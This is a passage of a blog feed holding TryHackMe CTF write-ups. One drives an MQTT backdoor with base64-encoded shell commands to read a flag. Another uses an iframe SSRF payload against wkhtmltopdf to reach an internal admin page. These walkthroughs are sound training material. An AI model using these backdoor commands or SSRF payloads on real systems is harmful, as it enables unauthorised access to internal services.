<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="8db2" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak<span class="hljs-keyword">@kali</span> ~ mosquitto_sub -t <span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span><br><br>SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=</span></pre>
<p id="2e16" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Another base64 encoded string. Now we are going to decode the base64 string.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="4f8c" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali ~ <span class="hljs-built_in">echo</span> <span class="hljs-string">"SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk="</span> | <span class="hljs-built_in">base64</span> -d<br>Invalid message format.<br>Format: <span class="hljs-built_in">base64</span>({<span class="hljs-string">"id"</span>: <span class="hljs-string">"&lt;backdoor id&gt;"</span>, <span class="hljs-string">"cmd"</span>: <span class="hljs-string">"&lt;command&gt;"</span>, <span class="hljs-string">"arg"</span>: <span class="hljs-string">"&lt;argument&gt;"</span>})%</span></pre>
<p id="fd8f" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Interesting! we got a massage format and the communication is base64 decoded. Here MQTT was expecting a base64 decoded massage and also want ‘id’, ‘cmd’, and ‘arg’. So, let’s make things right.</p>
<p id="c803" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Beginning we got ‘id’ = “cdd1b1c0–1c40–4b0f-8e22–61b357548b7d” and it’s accepting cmd “‘HELP’, ‘CMD’, ‘SYS’”. We are going to use “CMD’ and as ‘arg’ we are going to use “ls”.</p>
<p id="72c3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">The massage will be:</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="715b" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cdd1b1c0–1c40–4b0f-8e22–61b357548b7d"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"cmd"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"CMD"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"arg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ls"</span><span class="hljs-punctuation">}</span></span></pre>
<p id="57c9" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we need to encode it on base:</p>
<pre id="abfa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj">“e2lkOiAiY2RkMWIxYzDigJMxYzQw4oCTNGIwZi04ZTIy4oCTNjFiMzU3NTQ4YjdkIiwgY21kOiAiQ01EIiwgYXJnOiAibHMifQ==”</pre>
<p id="02d3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we send this base64 string as a massage. Our command will be:</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="0f02" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-keyword">@kali</span> ~ mosquitto_pub -t <span class="hljs-string">"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"</span> -m <span class="hljs-string">"e2lkOiAiY2RkMWIxYzDigJMxYzQw4oCTNGIwZi04ZTIy4oCTNjFiMzU3NTQ4YjdkIiwgY21kOiAiQ01EIiwgYXJnOiAibHMifQ=="</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span></span></pre>
<p id="d217" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We received something encoded in base64.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="6762" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-keyword">@kali</span> ~ mosquitto_sub -t <span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span><br><br>eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbij9</span></pre>
<p id="8764" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After Decode the base64 string finds a text file called “flag .txt”</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="97a4" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali ~ <span class="hljs-built_in">echo</span> <span class="hljs-string">"eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbij9"</span> | <span class="hljs-built_in">base64</span> -d<br><br>{<span class="hljs-string">"id"</span>:<span class="hljs-string">"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d"</span>,<span class="hljs-string">"response"</span>:<span class="hljs-string">"flag.txt\n}</span></span></pre>
<p id="0704" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">So, Let’s grab our flag. For that, we have to change the argument. And it will be ‘arg’ “cat flag.txt”</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="a03d" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cdd1b1c0–1c40–4b0f-8e22–61b357548b7d"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"cmd"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"CMD"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"arg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cat flag.txt"</span><span class="hljs-punctuation">}</span></span></pre>
<pre class="fo abx abp anr bo ans ba bj"><span id="d6be" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali ~ <span class="hljs-built_in">echo</span> <span class="hljs-string">"{"</span><span class="hljs-built_in">id</span><span class="hljs-string">": "</span>cdd1b1c0–1c40–4b0f-8e22–61b357548b7d<span class="hljs-string">", "</span>cmd<span class="hljs-string">": "</span>CMD<span class="hljs-string">", "</span>arg<span class="hljs-string">": "</span><span class="hljs-built_in">cat</span> flag.txt<span class="hljs-string">"}"</span> | <span class="hljs-built_in">base64</span><br><br>e2lkOiBjZGQxYjFjMOKAkzFjNDDigJM0YjBmLThlMjLigJM2MWIzNTc1NDhiN2QsIGNtZDogQ01E<br>LCBhcmc6IGNhdCBmbGFnLnR4dH0K</span></pre>
<p id="d204" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We have to decode it in base64 then we send another massage.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="0792" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak@kali ~ mosquitto_pub -t <span class="hljs-string">"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"</span> -m <span class="hljs-string">"e2lkOiBjZGQxYjFjMOKAkzFjNDDigJM0YjBmLThlMjLigJM2MWIzNTc1NDhiN2QsIGNtZDogQ01E<br>LCBhcmc6IGNhdCBmbGFnLnR4dH0K"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span></span></pre>
<p id="164d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In our subscriber part, we receive another base64 massage.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="cb44" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-keyword">@kali</span> ~ mosquitto_sub -t <span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span><br><br>eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3suLi4uLi4uLi4ufSJ9</span></pre>
<p id="86b7" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Hopefully, after decoding this string we’ll get our flag! Let’s see….</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="1bb5" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak@kali  ~/ctf/thm  <span class="hljs-built_in">echo</span> <span class="hljs-string">"eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3suLi4uLi4uLi4ufSJ9"</span> | <span class="hljs-built_in">base64</span> -d<br><br>{<span class="hljs-string">"id"</span>:<span class="hljs-string">"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d"</span>,<span class="hljs-string">"response"</span>:<span class="hljs-string">"flag{..........}</span></span></pre>
<p id="4ad3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Bingoo!!! we got our CTF flag…….</p>
<blockquote class="abq abr abs">
<p id="ef65" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">Note: In here I changed the base64 code to not reveal the flag. Cause I really want you to do all the stuff on your own. Why not? IoT hacking isa pleaser.</p>
</blockquote>
<p id="4755" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Happy Hacking!!!!! See you next time in another post :)</p>
<p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p>
<p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>: <a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p>
<p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy Bugged~</strong></p>
</div>
            ]]>
        </content>
    </entry>
    <entry>
        <title>TryHackMe | MD2PDF | CTF Writeup</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/tryhackme-or-md2pdf-or-ctf-writeup.html"/>
        <id>https://sakibulalikhan.pages.dev/tryhackme-or-md2pdf-or-ctf-writeup.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/4/TryHackMe-MD2PDF.jpg" medium="image" />
            <category term="Web Security"/>
            <category term="TryHackMe"/>
            <category term="CTF Writeups"/>

        <updated>2024-01-07T10:37:35+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/4/TryHackMe-MD2PDF.jpg" alt="" />
                    MD2PDF 🚀 TopTierConversions LTD is proud to present its latest product launch. This easy-to-use utility converts markdown files to PDF and is totally secure! Right…? Difficulty&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/4/TryHackMe-MD2PDF.jpg" class="type:primaryImage" alt="" /></p>
                <p id="1a74" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">MD2PDF</strong> 🚀 TopTierConversions LTD is proud to present its latest product launch. This easy-to-use utility converts markdown files to PDF and is totally secure! Right…?</p>
<p id="838c" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj"><strong>Difficulty =</strong> Easy</p>
<p id="0d0c" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Challenges:</strong> PDF, Markdown, SSRF.</p>
<p id="3dbc" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Beginning we start with Nmap scan. For scan we use ‘-sV’ flag to know about services &amp; versions. And we also use ‘-Pn’ flag to not ping to the server.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="2d3f" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-meta">@kali</span>:<span class="hljs-operator">~/</span>ctf$ sudo nmap <span class="hljs-operator">-</span>sV <span class="hljs-operator">-</span><span class="hljs-type">Pn</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">39.142</span><br><span class="hljs-type">Host</span> <span class="hljs-keyword">is</span> up (<span class="hljs-number">0</span>.19s latency).<br><span class="hljs-type">Not</span> shown: <span class="hljs-number">997</span> closed tcp ports (reset)<br><span class="hljs-type">PORT</span> <span class="hljs-type">STATE</span> <span class="hljs-type">SERVICE</span> <span class="hljs-type">VERSION</span><br><span class="hljs-number">22</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span> ssh <span class="hljs-type">OpenSSH</span> <span class="hljs-number">8</span>.2p1 <span class="hljs-type">Ubuntu</span> 4ubuntu0.<span class="hljs-number">5</span> (<span class="hljs-type">Ubuntu</span> <span class="hljs-type">Linux</span>; <span class="hljs-keyword">protocol</span> <span class="hljs-number">2.0</span>)<br><span class="hljs-number">80</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span> rtsp<br><span class="hljs-number">5000</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span> rtsp</span></pre>
<p id="0245" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">It looks like there are 3 services running on the machine, the standard HTTP server on port 80, an SSH server and another HTTP server on port 5000. The host also appears to be running some version of Ubuntu Server.</p>
<p id="de9c" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Let’s checking the web server on port 80 shows that it converts markdown file to pdf.</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km anx">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*qLZ7jXKtWTsaqrzO9Kklvw.png" alt="TryHackMe MD2PDF Writeup" width="700" height="293" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="dda0" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Here if i include any markdown code it will be converted to pdf.</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km any">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*MQ2gFGX98BxCS3CGdB2oCg.png" alt="TryHackMe MD2PDF writeup" width="700" height="269" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="fc2c" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">If I click on ‘Convert to PDF’ button then it’ll convert our Markdown code in PDF file.</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km anp">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*ZUzToTLxj9JCTW1RtyqypQ.png" alt="TryHackMe MD2PDF writeup" width="700" height="259" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="88c7" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we’ll download the generated PDF file to check out the metadata.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="e2ba" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-string">sak@kali:~/ctf$</span> <span class="hljs-string">file</span> <span class="hljs-string">document.pdf</span><br><span class="hljs-attr">document.pdf:</span> <span class="hljs-string">PDF</span> <span class="hljs-string">document,</span> <span class="hljs-string">version</span> <span class="hljs-number">1.4</span><span class="hljs-string">,</span> <span class="hljs-number">0</span> <span class="hljs-string">pages</span><br><span class="hljs-string">sak@kali:~/ctf$</span> <span class="hljs-string">exiftool</span> <span class="hljs-string">document.pdf</span><br><span class="hljs-attr">ExifTool Version Number         :</span> <span class="hljs-number">12.55</span><br><span class="hljs-attr">File Name                       :</span> <span class="hljs-string">document.pdf</span><br><span class="hljs-attr">Directory                       :</span> <span class="hljs-string">.</span><br><span class="hljs-attr">File Size                       :</span> <span class="hljs-number">7.4</span> <span class="hljs-string">kB</span><br><span class="hljs-attr">File Modification Date/Time     :</span> <span class="hljs-number">2023</span><span class="hljs-string">:02:20</span> <span class="hljs-number">06</span><span class="hljs-string">:48:03+06:00</span><br><span class="hljs-attr">File Access Date/Time           :</span> <span class="hljs-number">2023</span><span class="hljs-string">:02:20</span> <span class="hljs-number">20</span><span class="hljs-string">:53:48+06:00</span><br><span class="hljs-attr">File Inode Change Date/Time     :</span> <span class="hljs-number">2023</span><span class="hljs-string">:02:20</span> <span class="hljs-number">20</span><span class="hljs-string">:51:33+06:00</span><br><span class="hljs-attr">File Permissions                :</span> <span class="hljs-string">-rw-rw-r--</span><br><span class="hljs-attr">File Type                       :</span> <span class="hljs-string">PDF</span><br><span class="hljs-attr">File Type Extension             :</span> <span class="hljs-string">pdf</span><br><span class="hljs-attr">MIME Type                       :</span> <span class="hljs-string">application/pdf</span><br><span class="hljs-attr">PDF Version                     :</span> <span class="hljs-number">1.4</span><br><span class="hljs-attr">Linearized                      :</span> <span class="hljs-literal">No</span><br><span class="hljs-attr">Title                           :</span> <br><span class="hljs-attr">Creator                         :</span> <span class="hljs-string">wkhtmltopdf</span> <span class="hljs-number">0.12</span><span class="hljs-number">.5</span><br><span class="hljs-attr">Producer                        :</span> <span class="hljs-string">Qt</span> <span class="hljs-number">4.8</span><span class="hljs-number">.7</span><br><span class="hljs-attr">Create Date                     :</span> <span class="hljs-number">2023</span><span class="hljs-string">:02:20</span> <span class="hljs-number">00</span><span class="hljs-string">:36:44Z</span><br><span class="hljs-attr">Page Count                      :</span> <span class="hljs-number">1</span><br><span class="hljs-attr">Page Mode                       :</span> <span class="hljs-string">UseOutlines</span></span></pre>
<p id="d43c" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In here we see the creator name <code class="ff abm abn abo abp b">wkhtmltopdf 0.12.5</code> we’ll search on google to know if there’s publicly known exploit for it.</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km anz">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*ZMwkdK6VRI1gnPgypxa1zw.png" alt="TryHackMe MD2PDF writeup" width="700" height="357" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km anp">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*FLeQ8hLjn_sGFML83rUyUw.png" alt="TryHackMe MD2PDF writeup" width="700" height="359" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="6c8f" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After reading about the <a class="af rn" href="https://cyber-guy.gitbook.io/cyber-guys-blog/blogs/initial-access-via-pdf-file-silently" rel="noopener ugc nofollow" target="_blank">exploit</a> shows that we can use iframe tag and perform Server Side Request Forgery</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="8f25" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-title.class">Payload</span>: &lt;iframe src="http://localhost/" width="1000" height="2000"&gt;`</span></pre>
<p id="ead4" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we if we paste this payload to input section and submit on ‘Convert to PDF button. It’s actually not worked</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km anp">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*JDVQMlBq1k3ewvfT_lJG-A.png" alt="TryHackMe MD2PDF writeup" width="700" height="297" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km anp">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*VbRCo9BCm9S0zhRJLi9_iQ.png" alt="TryHackMe MD2PDF writeup" width="700" height="240" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="735a" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we’ll run gobuster to find if there’s any interesting thing or directory.</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km aoa">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg" alt="TryHackMe MD2PDF writeup" width="700" height="367" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="c0ef" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We got an admin directory which when accessed gives 403.</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km anp">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*U355yK93I5_hRbSQKVIwFw.png" alt="TryHackMe MD2PDF writeup" width="700" height="293" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="44aa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">But we got an interesting massage that <strong class="ly kz">it only be seen internally (localhost:5000).</strong></p>
<p id="31e9" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we can use it as leverage the SSRF vulnerability and view the admin directory on port 5000.</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km anp">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*wjFmdtFBiB6hNEQjeYbJ1Q.png" alt="TryHackMe MD2PDF writeup" width="700" height="364" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="05d0" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Copy this payload &amp; paste it. Then tap on the ‘Convert to PDF’ button.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="ff25" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-title.class">Payload</span>: &lt;iframe src="http://localhost:5000/admin" width="1000" height="2000"&gt;</span></pre>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km anp">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*WYsDb15y6dEfAQeiOrb11g.png" alt="TryHackMe MD2PDF writeup &amp; solve &amp; flag." width="700" height="270" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<p id="4131" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Bang……! We got our flag!!!!</p>
<p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p>
<p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>: <a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p>
<p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy MD2PDF~</strong></p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>How To Limit Battery Charging (Set A Charge Threshold) For ASUS Laptops On Linux</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/how-to-limit-battery-charging-set-a-charge-threshold-for-asus-laptops-on-linux.html"/>
        <id>https://sakibulalikhan.pages.dev/how-to-limit-battery-charging-set-a-charge-threshold-for-asus-laptops-on-linux.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/3/Charge-Threshold-lg.jpg" medium="image" />
            <category term="Linux"/>

        <updated>2024-01-07T10:34:41+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/3/Charge-Threshold-lg.jpg" alt="How To Limit Battery Charging (Set A Charge Threshold) For ASUS Laptops On Linux" />
                    Nowadays Asus laptops have a preinstalled program called Asus Battery Health Charging. In recent laptops, this feature is integrated into the MyAsus application. Using this feature users can&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/3/Charge-Threshold-lg.jpg" class="type:primaryImage" alt="How To Limit Battery Charging (Set A Charge Threshold) For ASUS Laptops On Linux" /></p>
                <div class="fp tp tq tr ts">
<div class="ab cm">
<div class="gv bg gw gx gy gz">
